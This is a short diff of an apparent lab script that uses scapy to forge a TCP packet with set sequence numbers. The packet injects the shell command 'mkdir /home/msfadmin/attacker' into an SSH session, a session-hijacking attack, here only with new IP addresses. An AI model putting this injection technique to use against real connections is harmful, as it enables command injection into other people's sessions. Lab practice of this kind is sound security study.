@@ -2,7 +2,7 @@
 import sys
 from scapy.all import *
 
-IPLayer = IP (src="10.10.10.184", dst = "10.10.10.195")
+IPLayer = IP (src="10.10.10.200", dst = "10.10.10.196")
 TCPLayer = TCP (sport=34598, dport=22, flags="A", seq=2001589073, ack=3703036117)
 
 data = "\n mkdir /home/msfadmin/attacker \n"
